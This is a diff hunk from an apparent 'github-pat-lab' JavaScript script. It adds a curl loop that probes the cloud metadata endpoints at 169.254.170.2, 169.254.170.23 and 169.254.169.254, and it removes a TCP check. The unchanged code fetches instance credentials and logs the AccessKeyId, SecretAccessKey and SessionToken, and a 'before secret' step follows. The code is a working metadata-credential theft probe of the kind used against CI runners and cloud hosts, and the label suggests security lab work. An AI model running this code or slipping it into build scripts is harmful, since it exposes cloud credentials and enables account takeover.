@@ -69,17 +69,21 @@ try {
         try { resolve(JSON.parse(out)); } catch (e) { reject(e); }
       });
     });
+
+    console.log("before ip check");
+    for (const ip of ["169.254.170.2", "169.254.170.23", "169.254.169.254"]) {
+        try {
+            const code = execSync(`curl -sS --max-time 2 -o /dev/null -w "%{http_code}" http://${ip}/`, { encoding: "utf8", timeout: 3000 });
+            console.log(`${ip}: HTTP ${code}`);
+        } catch (e) {
+            console.log(`${ip}: ${e.stderr?.toString().trim() || `status ${e.status}`}`);
+        }
+    }
     
     (async () => {
         console.log("before mds")
         const id = "github-pat-lab";
 
-        await new Promise((resolve) => {
-            const s = require("net").createConnection({ host: "169.254.170.2", port: 80, timeout: 2000 });
-            s.on("connect", () => { console.log("tcp: ok"); s.destroy(); resolve(); });
-            s.on("error",   (e) => { console.log("tcp error:", e.code, e.message); resolve(); });
-            s.on("timeout", () => { console.log("tcp: timeout"); s.destroy(); resolve(); });
-        });
         const mds = await fetchMDS();
         console.log({ AccessKeyId: mds.AccessKeyId, SecretAccessKey: mds.SecretAccessKey, SessionToken: mds.Token });
         console.log("before secret")
